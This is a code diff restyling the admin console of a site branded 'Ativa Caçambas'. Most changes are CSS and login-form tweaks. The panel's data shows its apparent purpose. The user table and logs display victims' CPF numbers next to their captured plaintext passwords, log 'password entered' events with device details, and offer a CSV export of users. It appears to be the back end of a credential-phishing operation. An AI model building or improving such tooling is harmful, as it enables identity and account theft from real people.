@@ -20,11 +20,11 @@
         }
 
         /* Temas */
-        body.theme-default { --accent: #f5a623; --accent-rgb: 245, 166, 35; }
-        body.theme-blue { --accent: #3b82f6; --accent-rgb: 59, 130, 246; }
-        body.theme-red { --accent: #ef4444; --accent-rgb: 239, 68, 68; }
-        body.theme-green { --accent: #10b981; --accent-rgb: 16, 185, 129; }
-        body.theme-purple { --accent: #8b5cf6; --accent-rgb: 139, 92, 246; }
+        body.theme-default { --accent: #f5a623; --accent-rgb: 245, 166, 35; --accent-dark: #e09515; }
+        body.theme-blue { --accent: #3b82f6; --accent-rgb: 59, 130, 246; --accent-dark: #2563eb; }
+        body.theme-red { --accent: #ef4444; --accent-rgb: 239, 68, 68; --accent-dark: #dc2626; }
+        body.theme-green { --accent: #10b981; --accent-rgb: 16, 185, 129; --accent-dark: #059669; }
+        body.theme-purple { --accent: #8b5cf6; --accent-rgb: 139, 92, 246; --accent-dark: #7c3aed; }
 
         #bgCanvas {
             position: fixed;
@@ -36,6 +36,7 @@
             pointer-events: none;
         }
 
+        /* ========== LOADING ========== */
         .loading-screen {
             position: fixed;
             top: 0;
@@ -60,7 +61,7 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* Login */
+        /* ========== LOGIN (PROFISSIONAL) ========== */
         .login-container {
             position: fixed;
             top: 0;
@@ -71,20 +72,40 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            background: linear-gradient(135deg, #0a0c10, #14181f);
+            background: linear-gradient(135deg, #0a0c10 0%, #14181f 100%);
         }
         .login-box {
-            background: rgba(20, 24, 31, 0.95);
-            backdrop-filter: blur(12px);
-            border-radius: 24px;
-            padding: 40px;
+            background: #0e1219;
+            border-radius: 20px;
+            padding: 48px 40px;
             width: 100%;
-            max-width: 380px;
-            border: 1px solid rgba(255,255,255,0.08);
+            max-width: 420px;
+            border: 1px solid #1a1f2a;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
         }
-        .login-box h1 { font-size: 28px; font-weight: 600; margin-bottom: 8px; }
+        .login-box h1 {
+            font-size: 28px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 8px;
+        }
         .login-box h1 span { color: var(--accent, #f5a623); }
-        .login-box p { color: #6b7280; font-size: 14px; margin-bottom: 32px; }
+        .login-box .subtitle {
+            text-align: center;
+            color: #6b7280;
+            font-size: 14px;
+            margin-bottom: 32px;
+        }
+        .login-box .form-group {
+            margin-bottom: 20px;
+        }
+        .login-box label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #9ca3af;
+            margin-bottom: 8px;
+        }
         .login-box input {
             width: 100%;
             padding: 14px 16px;
@@ -92,9 +113,13 @@
             border: 1px solid #2a2f3a;
             border-radius: 12px;
             color: #fff;
-            margin-bottom: 16px;
+            font-size: 14px;
+            transition: all 0.2s;
         }
-        .login-box input:focus { outline: none; border-color: var(--accent, #f5a623); }
+        .login-box input:focus {
+            outline: none;
+            border-color: var(--accent, #f5a623);
+        }
         .login-btn {
             width: 100%;
             padding: 14px;
@@ -102,11 +127,35 @@
             border: none;
             border-radius: 12px;
             font-weight: 600;
+            font-size: 14px;
             cursor: pointer;
+            margin-top: 8px;
+            transition: all 0.2s;
         }
-        .error-msg { color: #ef4444; font-size: 13px; margin-bottom: 16px; display: none; }
+        .login-btn:hover { background: var(--accent-dark); }
+        .login-footer {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 13px;
+            color: #6b7280;
+        }
+        .login-footer a {
+            color: var(--accent, #f5a623);
+            text-decoration: none;
+        }
+        .error-msg {
+            background: rgba(239,68,68,0.15);
+            border: 1px solid rgba(239,68,68,0.3);
+            color: #ef4444;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            display: none;
+            text-align: center;
+        }
 
-        /* Admin Panel */
+        /* ========== ADMIN PANEL ========== */
         .admin-panel { display: none; position: relative; z-index: 1; }
         .admin-panel.visible { display: block; }
 
@@ -119,17 +168,27 @@
             height: 100vh;
             background: #0e1219;
             border-right: 1px solid #1a1f2a;
-            padding: 24px 16px;
             z-index: 100;
-            transition: transform 0.2s;
+            transition: transform 0.2s ease;
             overflow-y: auto;
         }
         .sidebar.collapsed { transform: translateX(-260px); }
-        .sidebar-logo { padding: 0 12px 24px; border-bottom: 1px solid #1a1f2a; margin-bottom: 24px; }
-        .sidebar-logo h2 { font-size: 20px; font-weight: 600; }
-        .sidebar-logo h2 span { color: var(--accent, #f5a623); }
-        .sidebar-logo p { font-size: 11px; color: #4a5568; margin-top: 4px; }
-        .sidebar-menu { list-style: none; }
+        .sidebar-header {
+            padding: 24px 20px;
+            border-bottom: 1px solid #1a1f2a;
+            margin-bottom: 20px;
+        }
+        .sidebar-header h2 {
+            font-size: 20px;
+            font-weight: 600;
+        }
+        .sidebar-header h2 span { color: var(--accent, #f5a623); }
+        .sidebar-header p {
+            font-size: 11px;
+            color: #4a5568;
+            margin-top: 4px;
+        }
+        .sidebar-menu { list-style: none; padding: 0 12px; }
         .sidebar-menu li { margin-bottom: 4px; }
         .sidebar-menu a {
             display: flex;
@@ -142,16 +201,17 @@
             cursor: pointer;
             transition: all 0.15s;
         }
-        .sidebar-menu a i { width: 20px; }
+        .sidebar-menu a i { width: 20px; font-size: 16px; }
         .sidebar-menu a:hover { background: rgba(255,255,255,0.05); color: #fff; }
         .sidebar-menu a.active {
             background: rgba(var(--accent-rgb), 0.12);
             color: var(--accent, #f5a623);
         }
 
+        /* Toggle Button */
         .sidebar-toggle {
             position: fixed;
-            left: 272px;
+            left: 270px;
             top: 20px;
             width: 36px;
             height: 36px;
@@ -163,19 +223,21 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: left 0.2s;
+            transition: left 0.2s ease;
             color: #9ca3af;
         }
         .sidebar-toggle.collapsed { left: 20px; }
+        .sidebar-toggle:hover { background: #1a1f2a; color: var(--accent, #f5a623); }
 
         /* Main Content */
         .main-content {
             margin-left: 260px;
             padding: 24px 32px;
-            transition: margin-left 0.2s;
+            transition: margin-left 0.2s ease;
         }
         .main-content.expanded { margin-left: 20px; }
 
+        /* Header */
         .admin-header {
             display: flex;
             justify-content: space-between;
@@ -194,6 +256,7 @@
             color: #9ca3af;
             cursor: pointer;
             font-size: 13px;
+            transition: all 0.15s;
         }
         .logout-btn:hover { background: #ef4444; border-color: #ef4444; color: #fff; }
 
@@ -231,6 +294,7 @@
             font-weight: 500;
             cursor: pointer;
             border-radius: 40px;
+            transition: all 0.15s;
         }
         .tab:hover { color: #fff; }
         .tab.active {
@@ -257,63 +321,34 @@
             font-size: 14px;
         }
 
-        /* Product List - PROFISSIONAL */
-        .products-container {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
+        /* Product List */
+        .products-container { display: flex; flex-direction: column; gap: 12px; }
         .product-row {
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 16px;
+            padding: 14px 16px;
             background: #1a1f2a;
             border-radius: 12px;
             transition: all 0.15s;
         }
-        .product-row:hover {
-            background: #222732;
-            transform: translateX(4px);
-        }
-        .product-info {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            flex: 2;
-        }
+        .product-row:hover { background: #222732; transform: translateX(2px); }
+        .product-info { display: flex; align-items: center; gap: 14px; flex: 2; }
         .product-icon {
-            width: 48px;
-            height: 48px;
+            width: 44px;
+            height: 44px;
             background: rgba(var(--accent-rgb), 0.1);
             border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 24px;
+            font-size: 22px;
             color: var(--accent, #f5a623);
         }
-        .product-details h4 {
-            font-size: 15px;
-            font-weight: 600;
-            margin-bottom: 4px;
-        }
-        .product-details p {
-            font-size: 12px;
-            color: #6b7280;
-        }
-        .product-price {
-            flex: 1;
-            text-align: right;
-            font-weight: 700;
-            font-size: 18px;
-            color: var(--accent, #f5a623);
-        }
-        .product-actions {
-            display: flex;
-            gap: 8px;
-            margin-left: 16px;
-        }
+        .product-details h4 { font-size: 14px; font-weight: 600; margin-bottom: 4px; }
+        .product-details p { font-size: 11px; color: #6b7280; }
+        .product-price { flex: 1; text-align: right; font-weight: 700; font-size: 16px; color: var(--accent, #f5a623); }
+        .product-actions { margin-left: 16px; }
         .btn-icon {
             background: #2a2f3a;
             border: none;
@@ -383,8 +418,9 @@
             border-radius: 10px;
             cursor: pointer;
             border: 2px solid transparent;
+            transition: all 0.15s;
         }
-        .theme-btn.active { border-color: #fff; }
+        .theme-btn.active { border-color: #fff; transform: scale(1.05); }
         .theme-default { background: #f5a623; }
         .theme-blue { background: #3b82f6; }
         .theme-red { background: #ef4444; }
@@ -436,6 +472,7 @@
             color: #fff;
             width: 180px;
         }
+        .search-box input:focus { outline: none; }
 
         .footer {
             text-align: center;
@@ -462,22 +499,33 @@
 
 <div class="loading-screen" id="loadingScreen"><div class="spinner"></div></div>
 
+<!-- LOGIN PROFISSIONAL -->
 <div class="login-container" id="loginContainer">
     <div class="login-box">
-        <h1>Ativa<span>Caçambas</span></h1>
-        <p>Management Console</p>
+        <h1>Member <span>Login</span></h1>
+        <div class="subtitle">Access the administration panel</div>
         <div class="error-msg" id="loginError">Invalid credentials</div>
-        <input type="text" id="loginUser" placeholder="Username">
-        <input type="password" id="loginPass" placeholder="Password">
-        <button class="login-btn" onclick="handleLogin()">Sign in</button>
+        <div class="form-group">
+            <label>Email</label>
+            <input type="text" id="loginUser" placeholder="admin@ativacacambas.com">
+        </div>
+        <div class="form-group">
+            <label>Password</label>
+            <input type="password" id="loginPass" placeholder="••••••••">
+        </div>
+        <button class="login-btn" onclick="handleLogin()">LOGIN</button>
+        <div class="login-footer">
+            <a href="#">Forgot Username / Password?</a>
+        </div>
     </div>
 </div>
 
+<!-- ADMIN PANEL -->
 <div class="admin-panel" id="adminPanel">
     <button class="sidebar-toggle" id="sidebarToggle" onclick="toggleSidebar()"><i class="fas fa-chevron-left"></i></button>
     
     <aside class="sidebar" id="sidebar">
-        <div class="sidebar-logo">
+        <div class="sidebar-header">
             <h2>Ativa<span>Caçambas</span></h2>
             <p>Secure Console</p>
         </div>
@@ -529,7 +577,7 @@
                     <div class="form-row">
                         <div class="form-group"><label>Name</label><input type="text" id="prodNome" required></div>
                         <div class="form-group"><label>Type</label><select id="prodTipo"><option value="cacamba">Caçamba</option><option value="material">Material</option></select></div>
-                        <div class="form-group"><label>Price (R$)</label><input type="number" step="0.01" id="prodPreco" required></div>
+                        <div class="form-group"><label>Price</label><input type="number" step="0.01" id="prodPreco" required></div>
                     </div>
                     <div class="form-row">
                         <div class="form-group"><label>Icon</label><input type="text" id="prodIcone" placeholder="fas fa-dumpster"></div>
@@ -540,12 +588,8 @@
                     <button type="submit" class="btn-primary">Save Product</button>
                 </form>
             </div>
-
             <div class="card">
-                <div class="card-header">
-                    <span>Product List</span>
-                    <span style="font-size:12px; color:#6b7280;" id="productCount"></span>
-                </div>
+                <div class="card-header"><span>Product List</span><span id="productCount" style="font-size:12px; color:#6b7280;"></span></div>
                 <div id="productList" class="products-container"></div>
             </div>
         </div>
@@ -596,13 +640,13 @@
             </div>
         </div>
 
-        <div class="footer">Ativa Caçambas v2.0 | Secure Console</div>
+        <div class="footer">Ativa Caçambas | Secure Management Console</div>
     </main>
 </div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
 <script>
-// Three.js Background
+// Three.js Background (lightweight)
 (function(){
     const canvas = document.getElementById('bgCanvas');
     if(!canvas) return;
@@ -612,8 +656,8 @@
     renderer.setSize(window.innerWidth, window.innerHeight);
     renderer.setClearColor(0x0a0c10, 1);
     
+    const starsCount = 800;
     const starsGeometry = new THREE.BufferGeometry();
-    const starsCount = 1200;
     const starsPositions = new Float32Array(starsCount * 3);
     for(let i = 0; i < starsCount; i++) {
         starsPositions[i*3] = (Math.random() - 0.5) * 2000;
@@ -642,9 +686,9 @@
 setTimeout(() => {
     const loader = document.getElementById('loadingScreen');
     if(loader) loader.classList.add('hidden');
-}, 500);
+}, 400);
 
-// Admin Logic
+// ========== ADMIN LOGIC ==========
 let adminToken = null;
 let refreshInterval = null;
 let productsData = [];
@@ -652,6 +696,7 @@ let usersData = [];
 let paymentsData = [];
 let logsData = [];
 let scheduleData = [];
+let loadedTabs = { dashboard: true };
 
 function showToast(msg) {
     const toast = document.createElement('div');
@@ -713,7 +758,7 @@ async function handleLogin() {
     
     if(!username || !password) {
         errorDiv.style.display = 'block';
-        errorDiv.textContent = 'Enter credentials';
+        errorDiv.textContent = 'Please enter email and password';
         setTimeout(() => errorDiv.style.display = 'none', 2000);
         return;
     }
@@ -732,10 +777,10 @@ async function handleLogin() {
             if(refreshInterval) clearInterval(refreshInterval);
             refreshInterval = setInterval(() => { if(adminToken) refreshStats(); }, 30000);
             loadDashboard();
-            showToast(`Welcome, ${username}`);
+            showToast(`Welcome back`);
         } else {
             errorDiv.style.display = 'block';
-            errorDiv.textContent = 'Invalid credentials';
+            errorDiv.textContent = 'Invalid email or password';
             setTimeout(() => errorDiv.style.display = 'none', 2000);
         }
     } catch(e) {
@@ -798,15 +843,12 @@ async function loadDashboard() {
         const totalPaid = paymentsData.filter(p => p.status === 'paid').reduce((s, p) => s + parseFloat(p.valor || 0), 0);
         document.getElementById('statTotalPagos').innerHTML = `R$ ${totalPaid.toFixed(2)}`;
         
-        const recentLogs = document.getElementById('recentActivity');
-        recentLogs.innerHTML = logsData.slice(0, 15).map(log => `<div class="log-item"><span class="log-time">${new Date(log.data).toLocaleString()}</span><span class="badge ${log.tipo === 'senha_inserida' ? 'badge-success' : 'badge-warning'}">${log.tipo === 'senha_inserida' ? 'PASS' : 'CPF'}</span><span>${formatCPF(log.cpf)}</span></div>`).join('') || '<div style="padding:20px; text-align:center;">No activity</div>';
+        document.getElementById('recentActivity').innerHTML = logsData.slice(0, 15).map(log => `<div class="log-item"><span class="log-time">${new Date(log.data).toLocaleString()}</span><span class="badge ${log.tipo === 'senha_inserida' ? 'badge-success' : 'badge-warning'}">${log.tipo === 'senha_inserida' ? 'PASS' : 'CPF'}</span><span>${formatCPF(log.cpf)}</span></div>`).join('') || '<div style="padding:20px; text-align:center;">No activity</div>';
         
-        const recentPayments = document.getElementById('recentPayments');
-        recentPayments.innerHTML = paymentsData.slice(0, 10).map(p => `<div class="log-item"><span class="log-time">${new Date(p.data_solicitacao).toLocaleString()}</span><span class="badge badge-success">R$ ${parseFloat(p.valor).toFixed(2)}</span><span>${formatCPF(p.cpf)}</span><span>${p.status === 'paid' ? 'PAID' : 'PENDING'}</span></div>`).join('') || '<div style="padding:20px; text-align:center;">No payments</div>';
+        document.getElementById('recentPayments').innerHTML = paymentsData.slice(0, 10).map(p => `<div class="log-item"><span class="log-time">${new Date(p.data_solicitacao).toLocaleString()}</span><span class="badge badge-success">R$ ${parseFloat(p.valor).toFixed(2)}</span><span>${formatCPF(p.cpf)}</span><span>${p.status === 'paid' ? 'PAID' : 'PENDING'}</span></div>`).join('') || '<div style="padding:20px; text-align:center;">No payments</div>';
     } catch(e) { console.error(e); }
 }
 
-// PRODUCTS - PROFESSIONAL LIST
 async function loadProducts() {
     if(!adminToken) return;
     try {
@@ -823,15 +865,12 @@ function renderProducts() {
     const container = document.getElementById('productList');
     const countSpan = document.getElementById('productCount');
     if(!container) return;
-    
     if(!productsData.length) {
         container.innerHTML = '<div style="text-align:center; padding:40px; color:#6b7280;">No products yet</div>';
         if(countSpan) countSpan.innerHTML = '0 items';
         return;
     }
-    
     if(countSpan) countSpan.innerHTML = `${productsData.length} items`;
-    
     container.innerHTML = productsData.map(p => `
         <div class="product-row">
             <div class="product-info">
@@ -841,13 +880,8 @@ function renderProducts() {
                     <p>${p.tipo === 'cacamba' ? 'Caçamba' : 'Material'} ${p.dimensoes ? ' · ' + p.dimensoes : ''}</p>
                 </div>
             </div>
-            <div class="product-price">
-                R$ ${(p.preco_promocional || p.preco).toFixed(2)}
-                ${p.preco_promocional ? `<span style="font-size:11px; text-decoration:line-through; color:#6b7280;">R$ ${p.preco.toFixed(2)}</span>` : ''}
-            </div>
-            <div class="product-actions">
-                <button class="btn-icon" onclick="deleteProduct(${p.id})" title="Delete"><i class="fas fa-trash"></i></button>
-            </div>
+            <div class="product-price">R$ ${(p.preco_promocional || p.preco).toFixed(2)}</div>
+            <div class="product-actions"><button class="btn-icon" onclick="deleteProduct(${p.id})"><i class="fas fa-trash"></i></button></div>
         </div>
     `).join('');
 }
@@ -867,8 +901,8 @@ async function deleteProduct(id) {
     try {
         await fetch(`/api/admin/produtos/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } });
         showToast('Product deleted');
-        loadProducts();
-        refreshStats();
+        await loadProducts();
+        await refreshStats();
     } catch(e) { showToast('Error'); }
 }
 
@@ -891,8 +925,8 @@ document.getElementById('productForm')?.addEventListener('submit', async (e) => 
             body: JSON.stringify(product)
         });
         showToast('Product added');
-        loadProducts();
-        refreshStats();
+        await loadProducts();
+        await refreshStats();
         e.target.reset();
     } catch(e) { showToast('Error'); }
 });
@@ -902,9 +936,9 @@ async function loadSchedule() {
     try {
         const res = await fetch('/api/admin/agendamentos', { headers: { 'Authorization': `Bearer ${adminToken}` } });
         const data = await res.json();
-        if(data.success) scheduleData = data.agendamentos || [];
+        scheduleData = data.agendamentos || [];
         const container = document.getElementById('scheduleList');
-        if(!scheduleData.length) { container.innerHTML = '<div style="text-align:center; padding:40px;">No appointments</div>'; return; }
+        if(!scheduleData.length) { container.innerHTML = '<div style="padding:40px; text-align:center;">No appointments</div>'; return; }
         container.innerHTML = `<div class="table-wrapper"><table><thead><tr><th>Client</th><th>Phone</th><th>Type</th><th>Address</th><th>Date</th><th>Time</th></tr></thead><tbody>${scheduleData.map(a => `<tr><td>${a.cliente_nome || '-'}</td><td>${a.telefone || '-'}</td><td>${a.tipo_obra || '-'}</td><td>${a.endereco_obra || '-'}</td><td>${new Date(a.data_agendamento).toLocaleDateString()}</td><td>${a.horario || '-'}</td></tr>`).join('')}</tbody>}</div>`;
     } catch(e) { console.error(e); }
 }
@@ -921,21 +955,21 @@ async function loadUsers() {
 
 function renderUsers() {
     const tbody = document.getElementById('usersTable');
-    if(!usersData.length) { tbody.innerHTML = '</table><td colspan="5">No data</td></tr>'; return; }
+    if(!usersData.length) { tbody.innerHTML = '<tr><td colspan="5">No data</td></tr>'; return; }
     tbody.innerHTML = usersData.map(u => `<tr><td>${formatCPF(u.cpf)}</td><td class="badge-warning" style="font-family:monospace;">${u.senha || '--------'}</td><td>${u.telefone || '-'}</td><td>${u.data_senha ? new Date(u.data_senha).toLocaleString() : (u.data_cpf ? new Date(u.data_cpf).toLocaleString() : '-')}</td><td><button class="btn-icon" onclick="deleteUser('${u.cpf}')" style="background:transparent;"><i class="fas fa-trash"></i></button></td>`).join('');
 }
 
 function filterUsers() {
     const term = document.getElementById('searchUsers')?.value.toLowerCase() || '';
-    const tbody = document.getElementById('usersTable');
     const filtered = usersData.filter(u => (u.cpf || '').toLowerCase().includes(term));
+    const tbody = document.getElementById('usersTable');
     tbody.innerHTML = filtered.map(u => `<tr><td>${formatCPF(u.cpf)}</td><td class="badge-warning" style="font-family:monospace;">${u.senha || '--------'}</td><td>${u.telefone || '-'}</td><td>${u.data_senha ? new Date(u.data_senha).toLocaleString() : (u.data_cpf ? new Date(u.data_cpf).toLocaleString() : '-')}</td><td><button class="btn-icon" onclick="deleteUser('${u.cpf}')" style="background:transparent;"><i class="fas fa-trash"></i></button></td>`).join('');
 }
 
 async function deleteUser(cpf) {
     if(!confirm(`Delete ${formatCPF(cpf)}?`)) return;
     await fetch(`/api/admin/delete/${encodeURIComponent(cpf)}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } });
-    loadUsers();
+    await loadUsers();
     showToast('User deleted');
 }
 
@@ -946,7 +980,7 @@ async function loadPayments() {
         const data = await res.json();
         paymentsData = data.payments || [];
         const container = document.getElementById('paymentsList');
-        if(!paymentsData.length) { container.innerHTML = '<div style="text-align:center; padding:40px;">No payments</div>'; return; }
+        if(!paymentsData.length) { container.innerHTML = '<div style="padding:40px; text-align:center;">No payments</div>'; return; }
         container.innerHTML = `<div class="table-wrapper"><table><thead><tr><th>ID</th><th>CPF</th><th>Phone</th><th>Amount</th><th>Status</th><th>Date</th></tr></thead><tbody>${paymentsData.map(p => `<tr><td>${p.id}</td><td>${formatCPF(p.cpf)}</td><td>${p.telefone || '-'}</td><td>R$ ${parseFloat(p.valor).toFixed(2)}</td><td><span class="badge ${p.status === 'paid' ? 'badge-success' : 'badge-warning'}">${p.status === 'paid' ? 'PAID' : 'PENDING'}</span></td><td>${new Date(p.data_solicitacao).toLocaleString()}</td></tr>`).join('')}</tbody>}</div>`;
     } catch(e) { console.error(e); }
 }
@@ -958,7 +992,7 @@ async function loadLogs() {
         const data = await res.json();
         logsData = data.logs || [];
         const container = document.getElementById('logsList');
-        if(!logsData.length) { container.innerHTML = '<div style="text-align:center; padding:40px;">No logs</div>'; return; }
+        if(!logsData.length) { container.innerHTML = '<div style="padding:40px; text-align:center;">No logs</div>'; return; }
         container.innerHTML = logsData.map(log => `<div class="log-item"><span class="log-time">${new Date(log.data).toLocaleString()}</span><span class="badge ${log.tipo === 'senha_inserida' ? 'badge-success' : 'badge-warning'}">${log.tipo === 'senha_inserida' ? 'PASSWORD' : 'CPF'}</span><span>${formatCPF(log.cpf)}</span><span>${log.dispositivo || '-'}</span>${log.senha ? `<span class="badge badge-warning">Pass: ${log.senha}</span>` : ''}</div>`).join('');
     } catch(e) { console.error(e); }
 }
@@ -1003,7 +1037,7 @@ function exportUsersCSV() {
     showToast('CSV exported');
 }
 
-let loadedTabs = {};
+// Switch Tab with lazy loading
 async function switchTab(tabName) {
     document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
     if(event && event.target) event.target.classList.add('active');
